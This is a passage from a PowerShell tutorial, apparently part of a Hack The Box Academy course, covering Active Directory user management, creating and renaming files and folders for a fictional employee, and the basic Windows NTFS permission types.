<li><code>Enabled</code>: Tells us if the user is active and can log in.</li>
<li><code>SamAccountName</code>: The representation of the username used to log into the ActiveDirectory hosts.</li>
<li><code>ObjectGUID</code>: Is the unique identifier of the user object.</li>
</ul>
<p>Users have many different attributes ( not all shown here ) and can all be used to identify and group them. We could also use these to filter specific attributes. For example, let us filter the user&#39;s <code>Email address</code>.</p>
<p><strong>Searching On An Attribute</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; Get-ADUser -Filter {EmailAddress -like <span class="hljs-string">'*greenhorn.corp'</span>}


<span class="hljs-string">DistinguishedName :</span> CN=TSilver,CN=Users,DC=greenhorn,DC=corp
<span class="hljs-string">Enabled           :</span> True
<span class="hljs-string">GivenName         :</span>
<span class="hljs-string">Name              :</span> TSilver
<span class="hljs-string">ObjectClass       :</span> user
<span class="hljs-string">ObjectGUID        :</span> a19a6c8a<span class="hljs-number">-000</span>a<span class="hljs-number">-4</span>cbf-aa14<span class="hljs-number">-0</span>c7fca643c37
<span class="hljs-string">SamAccountName    :</span> TSilver
<span class="hljs-string">SID               :</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1480833693</span><span class="hljs-number">-1324064541</span><span class="hljs-number">-2711030367</span><span class="hljs-number">-1602</span>
<span class="hljs-string">Surname           :</span>
<span class="hljs-string">UserPrincipalName :</span>
</code></pre>
<p>In our output, we can see that we only had one result for a user with an email address matching our naming context <code>*greenhorn.corp</code>. This is just one example of attributes we can filter on. For a more detailed list, check out this <a href="https://social.technet.microsoft.com/wiki/contents/articles/12037.active-directory-get-aduser-default-and-extended-properties.aspx">Technet Article</a>, which covers the default and extended user object properties.</p>
<p>We need to create a new user for an employee named <code>Mori Tanaka</code> who just joined Greenhorn. Let us give the New-ADUser cmdlet a try.</p>
<p><strong>New ADUser</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; New-ADUser -Name <span class="hljs-string">"MTanaka"</span> -Surname <span class="hljs-string">"Tanaka"</span> -GivenName <span class="hljs-string">"Mori"</span> -Office <span class="hljs-string">"Security"</span> -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (<span class="hljs-keyword">Read</span>-Host -AsSecureString <span class="hljs-string">"AccountPassword"</span>) -<span class="hljs-keyword">Enabled</span> $true 

AccountPassword: ****************
PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-ADUser -<span class="hljs-keyword">Identity</span> MTanaka -<span class="hljs-keyword">Properties</span> * | <span class="hljs-keyword">Format</span>-<span class="hljs-keyword">Table</span> Name,<span class="hljs-keyword">Enabled</span>,GivenName,Surname,Title,Office,Mail

Name    <span class="hljs-keyword">Enabled</span> GivenName Surname Title  Office   Mail
----    ------- --------- ------- -----  ------   ----
MTanaka    <span class="hljs-keyword">True</span> Mori      Tanaka  Sensei Security MTanaka@greenhorn.corp
</code></pre>
<p>Ok, a lot is going on here. It may look daunting but let us dissect it. The <code>first</code> portion of the output above is creating our user:</p>
<ul>
<li><code>New-ADUser -Name &quot;MTanaka&quot;</code> : We issue the <code>New-ADUser</code> command and set the user&#39;s SamAccountName to <code>MTanaka</code>.</li>
<li><code>-Surname &quot;Tanaka&quot; -GivenName &quot;Mori&quot;</code>: This portion sets our user&#39;s <code>Lastname</code> and <code>Firstname</code>.</li>
<li><code>-Office &quot;Security&quot;</code>: Sets the extended property of <code>Office</code> to <code>Security</code>.</li>
<li><code>-OtherAttributes @{&#39;title&#39;=&quot;Sensei&quot;;&#39;mail&#39;=&quot;MTanaka@greenhorn.corp&quot;}</code>: Here we set other extended attributes such as <code>title</code> and <code>Email-Address</code>.</li>
<li><code>-Accountpassword (Read-Host -AsSecureString &quot;AccountPassword&quot;)</code>: With this portion, we set the user&#39;s <code>password</code> by having the shell prompt us to enter a new password. (we can see it in the line below with the stars)</li>
<li><code>-Enabled $true</code>: We are enabling the account for use. The user could not log in if this was set to <code>\$False</code>.</li>
</ul>
<p>The <code>second</code> is validating that the user we created and the properties we set exist:</p>
<ul>
<li><code>Get-ADUser -Identity MTanaka -Properties *</code>: Here, we are searching for the user&#39;s properties <code>MTanaka</code>.</li>
<li><code>|</code> : This is the Pipe symbol. It will be explored more in another section, but for now, it takes our <code>output</code> from <code>Get-ADUser</code> and sends it into the following command.</li>
<li><code>Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail</code>: Here, we tell PowerShell to <code>Format</code> our results as a <code>table</code> including the default and extended properties listed.</li>
</ul>
<p>Seeing the commands broken down like this helps demystify the strings. Now, what if we need to modify a user? <code>Set-ADUser</code> is our ticket. Many of the filters we looked at earlier apply here as well. We can change or set any of the attributes that were listed. For this example, let us add a <code>Description</code> to Mr. Tanaka.</p>
<p><strong>Changing a Users Attributes</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Set-ADUser -Identity MTanaka -Description <span class="hljs-string">" Sensei to Security Analyst's Rocky, Colt, and Tum-Tum"</span>  

PS C:\htb&gt; Get-ADUser -Identity MTanaka -Property Description


Description       :  <span class="hljs-type">Sensei</span> to Security Analyst<span class="hljs-symbol">'s</span> Rocky, Colt, <span class="hljs-keyword">and</span> Tum-Tum
DistinguishedName : <span class="hljs-type">CN</span>=MTanaka,CN=Users,DC=greenhorn,DC=corp
Enabled           : <span class="hljs-type">True</span>
GivenName         : <span class="hljs-type">Mori</span>
Name              : <span class="hljs-type">MTanaka</span>
ObjectClass       : <span class="hljs-type">user</span>
ObjectGUID        : <span class="hljs-type">c19e402d</span>-b002-<span class="hljs-number">4</span>ca0-b5ac-<span class="hljs-number">59</span>d416166b3a
SamAccountName    : <span class="hljs-type">MTanaka</span>
SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1480833693</span>-<span class="hljs-number">1324064541</span>-<span class="hljs-number">2711030367</span>-<span class="hljs-number">1603</span>
Surname           : <span class="hljs-type">Tanaka</span>
UserPrincipalName :
</code></pre>
<p>Querying AD, we can see that the <code>description</code> we set has been added to the attributes of Mr. Tanaka. User and group management is a common task we may find ourselves doing as sysadmins. However, why should we care about it as a <code>pentester</code>?</p>
<h3 id="why-is-enumerating-users-groups-important-">Why is Enumerating Users &amp; Groups Important?</h3>
<p>Users and groups provide a wealth of opportunities regarding Pentesting a Windows environment. We will often see users misconfigured. They may be given excessive permissions, added to unnecessary groups, or have weak/no passwords set. Groups can be equally as valuable. Often groups will have nested membership, allowing users to gain privileges they may not need. These misconfigurations can be easily found and visualized with Tools like <a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a>. For a detailed look at enumerating Users and Groups, check out the <a href="https://academy.hackthebox.com/course/preview/windows-privilege-escalation">Windows Privilege Escalation</a> module.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>Now that we have the User and Group management down let&#39;s move on to working with files, folders, and other objects with PowerShell.</p>
<h2 id="working-with-files-and-directories">Working with Files and Directories</h2>
<hr>
<p>We already know how to navigate around the host and manage users and groups utilizing only PowerShell; now, it is time to explore files and directories. In this section, we will experiment with creating, modifying, and deleting files and directories, along with a quick introduction to file permissions and how to enumerate them. By now, we should be familiar with the <code>Get, Set, New</code> verbs, among others, so we will speed this up with our examples by combining several commands into a single shell session.</p>
<hr>
<h3 id="creating-moving-deleting-files-directories">Creating/Moving/Deleting Files &amp; Directories</h3>
<p>Many of the cmdlets we will discuss in this section can apply to working with files and folders, so we will combine some of our actions to work more efficiently (as any good pentester or sysadmin should strive to.). The table below lists the commonly used cmdlets used when dealing with objects in PowerShell.</p>
<p><strong>Common Commands Used for File &amp; Folder Management</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Alias</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-Item</code></td>
<td>gi</td>
<td>Retrieve an object (could be a file, folder, registry object, etc.)</td>
</tr>
<tr>
<td><code>Get-ChildItem</code></td>
<td>ls / dir / gci</td>
<td>Lists out the content of a folder or registry hive.</td>
</tr>
<tr>
<td><code>New-Item</code></td>
<td>md / mkdir / ni</td>
<td>Create new objects. ( can be files, folders, symlinks, registry entries, and more)</td>
</tr>
<tr>
<td><code>Set-Item</code></td>
<td>si</td>
<td>Modify the property values of an object.</td>
</tr>
<tr>
<td><code>Copy-Item</code></td>
<td>copy / cp / ci</td>
<td>Make a duplicate of the item.</td>
</tr>
<tr>
<td><code>Rename-Item</code></td>
<td>ren / rni</td>
<td>Changes the object name.</td>
</tr>
<tr>
<td><code>Remove-Item</code></td>
<td>rm / del / rmdir</td>
<td>Deletes the object.</td>
</tr>
<tr>
<td><code>Get-Content</code></td>
<td>cat / type</td>
<td>Displays the content within a file or object.</td>
</tr>
<tr>
<td><code>Add-Content</code></td>
<td>ac</td>
<td>Append content to a file.</td>
</tr>
<tr>
<td><code>Set-Content</code></td>
<td>sc</td>
<td>overwrite any content in a file with new data.</td>
</tr>
<tr>
<td><code>Clear-Content</code></td>
<td>clc</td>
<td>Clear the content of the files without deleting the file itself.</td>
</tr>
<tr>
<td><code>Compare-Object</code></td>
<td>diff / compare</td>
<td>Compare two or more objects against each other. This includes the object itself and the content within.</td>
</tr>
</tbody>
</table>
<p>Scenario: Greenhorn&#39;s new Security Chief, Mr. Tanaka, has requested that a set of files and folders be created for him. He plans to use them for SOP documentation for the Security team. Since he just got host access, we have agreed to set the file &amp; folder structure up for him. If you would like to follow along with the examples below, please feel free. For your practice, we removed the folders and files discussed below so you can take a turn recreating them.</p>
<p>First, we are going to start with the folder structure he requested. We are going to make three folders named :</p>
<ul>
<li><code>SOPs</code><ul>
<li><code>Physical Sec</code></li>
<li><code>Cyber Sec</code></li>
<li><code>Training</code></li>
</ul>
</li>
</ul>
<p>We will use the <code>Get-Item</code>, <code>Get-ChildItem</code>, and <code>New-Item</code> commands to create our folder structure. Let us get started. We first need to determine <code>where we are</code> in the host and then move to Mr. Tanaka&#39;s <code>Documents</code> folder.</p>
<p><strong>Finding Our Place</strong></p>
<p>Working with Files and Directories</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Location

<span class="hljs-section">Path
----</span>
C:\Users\MTanaka

PS C:\Users\MTanaka&gt; cd Documents
PS C:\Users\MTanaka\Documents&gt;
</code></pre>
<p>Now that we are in the correct directory, it&#39;s time to get to work. Next, we need to make the SOPs folder. The New-Item Cmdlet can be used to accomplish this.</p>
<p><strong>New-Item</strong></p>
<p>Working with Files and Directories</p>
<pre><code class="lang-powershell-session">PS C:\Users\MTanaka\Documents&gt; <span class="hljs-built_in"> new-item </span>-name <span class="hljs-string">"SOPs"</span> -type directory


    Directory: C:\Users\MTanaka\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/5/2022  12:20 PM                SOPs
</code></pre>
<p>Awesome. Our main directory exists now. Let us create our nested folders <code>Physical Sec, Cyber Sec, and Training</code>. We can utilize the same command from last time or the alias <code>mkdir</code>. First, we need to move into the <code>SOPs</code> Directory.</p>
<p><strong>Making More Directories</strong></p>
<p>Working with Files and Directories</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments&gt; cd SOPs 

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs&gt; mkdir "Physical Sec"

    Directory: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/5/2022   4:30 PM                Physical Sec

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs&gt; mkdir "Cyber Sec"

    Directory: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/5/2022   4:30 PM                Cyber Sec

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs&gt; mkdir "Training"

    Directory: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/5/2022   4:31 PM                Training  

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs&gt; Get-ChildItem 

Directory: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/5/2022   9:08 AM                Cyber Sec
d-----        11/5/2022   9:09 AM                Physical Sec
d-----        11/5/2022   9:08 AM                Training
</code></pre>
<p>Now that we have our directory structure in place. It&#39;s time to start populating the files required. Mr. Tanaka asked for a Markdown file in each folder like so:</p>
<ul>
<li><code>SOPs</code> &gt; ReadMe.md<ul>
<li><code>Physical Sec</code> &gt; Physical-Sec-draft.md</li>
<li><code>Cyber Sec</code> &gt; Cyber-Sec-draft.md</li>
<li><code>Training</code> &gt; Employee-Training-draft.md</li>
</ul>
</li>
</ul>
<p>In each file, he has requested this header at the top:</p>
<ul>
<li>Title: Insert Document Title Here</li>
<li>Date: x/x/202x</li>
<li>Author: MTanaka</li>
<li>Version: 0.1 (Draft)</li>
</ul>
<p>We should be able to quickly knock this out using the <code>New-Item</code> cmdlet and the <code>Add-Content</code> cmdlet.</p>
<p><strong>Making Files</strong></p>
<p>Working with Files and Directories</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span>&gt; new-Item "Readme.md" -ItemType File

    Directory: C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span>

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:12 AM              0 Readme.md

PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span>&gt; cd '.<span class="hljs-tag">\<span class="hljs-name">Physical</span></span> Sec<span class="hljs-tag">\<span class="hljs-name">'</span></span>
PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Physical</span></span> Sec&gt; ls
PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Physical</span></span> Sec&gt; new-Item "Physical-Sec-draft.md" -ItemType File

    Directory: C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Physical</span></span> Sec

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:14 AM              0 Physical-Sec-draft.md

PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Physical</span></span> Sec&gt; cd ..
PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span>&gt; cd '.<span class="hljs-tag">\<span class="hljs-name">Cyber</span></span> Sec<span class="hljs-tag">\<span class="hljs-name">'</span></span>

PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Cyber</span></span> Sec&gt; new-Item "Cyber-Sec-draft.md" -ItemType File

    Directory: C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Cyber</span></span> Sec

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:14 AM              0 Cyber-Sec-draft.md

PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Cyber</span></span> Sec&gt; cd ..
PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span>&gt; cd .<span class="hljs-tag">\<span class="hljs-name">Training</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Training</span></span>&gt; ls
PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Training</span></span>&gt; new-Item "Employee-Training-draft.md" -ItemType File

    Directory: C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Training</span></span>

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:15 AM              0 Employee-Training-draft.md

PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span><span class="hljs-tag">\<span class="hljs-name">Training</span></span>&gt; cd ..
PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">MTanaka</span></span><span class="hljs-tag">\<span class="hljs-name">Documents</span></span><span class="hljs-tag">\<span class="hljs-name">SOPs</span></span>&gt; tree /F
Folder PATH listing
Volume serial number is F684-763E
C:.
│   Readme.md
│
├───Cyber Sec
│       Cyber-Sec-draft.md
│
├───Physical Sec
│       Physical-Sec-draft.md
│
└───Training
        Employee-Training-draft.md
</code></pre>
<p>Now that we have our files, we need to add content inside them. We can do so with the <code>Add-Content</code> cmdlet.</p>
<p><strong>Adding Content</strong></p>
<p>Working with Files and Directories</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Add-Content .<span class="hljs-symbol">\R</span>eadme.md "Title: Insert Document Title Here
&gt;&gt; Date: x/x/202x
&gt;&gt; Author: MTanaka
&gt;&gt; Version: 0.1 (Draft)"  

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs&gt; cat .<span class="hljs-symbol">\R</span>eadme.md
Title: Insert Document Title Here
Date: x/x/202x
Author: MTanaka
Version: 0.1 (Draft)
</code></pre>
<p>We would then perform this same process we did for <code>Readme.md</code> in every other file we created for Mr. Tanaka. This scenario felt a bit tedious, right? Creating files over and over by hand can get tiresome. This is where automation and scripting come into place. It is a bit out of reach right now, but in a later section in this module, we will discuss how to make a quick PowerShell Module, using variables and writing scripts to make things easier.</p>
<p>Scenario Cont.: Mr. Tanaka has asked us to change the name of the file `Cyber-Sec-draft.md` to `Infosec-SOP-draft.md`.</p>
<p>We can quickly knock this task out using the <code>Rename-Item</code> cmdlet. Lets&#39; give it a try:</p>
<p><strong>Renaming An Object</strong></p>
<p>Working with Files and Directories</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs<span class="hljs-symbol">\C</span>yber Sec&gt; ls

    Directory: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs<span class="hljs-symbol">\C</span>yber Sec

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:14 AM              0 Cyber-Sec-draft.md

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs<span class="hljs-symbol">\C</span>yber Sec&gt; Rename-Item .<span class="hljs-symbol">\C</span>yber-Sec-draft.md -NewName Infosec-SOP-draft.md
PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs<span class="hljs-symbol">\C</span>yber Sec&gt; ls

    Directory: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\S</span>OPs<span class="hljs-symbol">\C</span>yber Sec

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022   9:14 AM              0 Infosec-SOP-draft.md
</code></pre>
<p>All we needed to do above was issue the <code>Rename-Item</code> cmdlet, give it the original filename we want to change (<code>Cyber-Sec-draft.md</code>), and then tell it our new name with the <code>-NewName</code> (<code>Infosec-SOP-draft.md</code>) parameter. Seems simple right? We could take this further and rename all files within a directory or change the file type or several different actions. In our example below, we will change the names of all text files in Mr. Tanakas Desktop from <code>file.txt</code> to <code>file.md</code>.</p>
<p><strong>Files1-5.txt are on MTanaka&#39;s Desktop</strong></p>
<p>Working with Files and Directories</p>
<pre><code class="lang-powershell-session">PS C:\Users\MTanaka\Desktop&gt; ls

    Directory: C:\Users\MTanaka\Desktop

Mode                 LastWriteTime         Length Name
-<span class="ruby">---                 -------------         ------ ----
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">1</span>.txt
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">2</span>.txt
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">3</span>.txt
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">4</span>.txt
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">5</span>.txt
</span>
PS C:\Users\MTanaka\Desktop&gt; get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}
PS C:\Users\MTanaka\Desktop&gt; ls

    Directory: C:\Users\MTanaka\Desktop

Mode                 LastWriteTime         Length Name
-<span class="ruby">---                 -------------         ------ ----
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">1</span>.md
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">2</span>.md
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">3</span>.md
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">4</span>.md
</span>-<span class="ruby">a----        <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span> PM              <span class="hljs-number">0</span> file-<span class="hljs-number">5</span>.md</span>
</code></pre>
<p>As we can see above, we had five text files on the Desktop. We changed them to <code>.md</code> files using <code>get-childitem -Path *.txt</code> to select the objects and used <code>|</code> to send those objects to the <code>rename-item -NewName {$_.name -replace &quot;.txt&quot;,&quot;.md&quot;}</code> cmdlet which renames everything from its original name ($_.name) and replaces the <code>.txt</code> from name to <code>.md</code>. This is a much faster way to interact with files and perform bulk actions. Now that we have completed all of Mr. Tanakas&#39; requests, let us discuss File and Directory permissions for a second.</p>
<hr>
<h3 id="what-are-file-directory-permissions">What are File &amp; Directory Permissions</h3>
<p>Permissions, simplified, are our host&#39;s way of determining who has access to a specific object and what they can do with it. These permissions allow us to apply granular security control over our objects to maintain a proper security posture. In environments like large organizations with multiple departments (like HR, IT, Sales, etc.), want to ensure they keep information access on a &quot;need to know&quot; basis. This ensures that an outsider cannot corrupt or misuse the data. The Windows file system has many basic and advanced permissions. Some of the key permission types are:</p>
<p><strong>Permission Types Explained</strong></p>
<ul>
<li><code>Full Control</code>: Full Control allows for the user or group specified the ability to interact with the file as they see fit. This includes everything below, changing the permissions, and taking ownership of the file.</li>
<li><code>Modify</code>: Allows reading, writing, and deleting files and folders.</li>
<li><code>List Folder Contents</code>: This makes viewing and listing folders and subfolders possible along with executing files. This only applies to <code>folders</code>.</li>
<li><code>Read and Execute</code>: Allows users to view the contents within files and run executables (.ps1, .exe, .bat, etc.)</li>
<li><code>Write</code>: Write allows a user the ability to create new files and subfolders along with being able to add content to files.</li>
<li><code>Read</code>: Allows for viewing and listing folders and subfolders and viewing a file&#39;s contents.</li>
<li><code>Traverse Folder</code>: Traverse allows us to give a user the ability to access files or subfolders within a tree but not have access to the higher-level folder&#39;s contents. This is a way to provide selective access from a security perspective.</li>
</ul>
<p>Windows ( NTFS, in general ) allows us to set permissions on a parent directory and have those permissions populate each file and folder located within that directory. This saves us a ton of time compared to manually setting the permissions on each object contained within. This inheritance can be disabled as necessary for specific files, folders, and sub-folders. If done, we will have to set the permissions we want on the affected files manually. Working with permissions can be a complex task and a bit much to do just from the CLI, so we will leave playing with permissions to the <code>Windows Fundamentals Module</code>.</p>
<hr>
<p>Working with Files and Directories is straightforward, even if sometimes a bit tedious. Moving forward, we will add another layer to our CLI foundation and look at how we can <code>find</code> and <code>filter</code> content within files on the host.</p>
<h2 id="finding-filtering-content">Finding &amp; Filtering Content</h2>
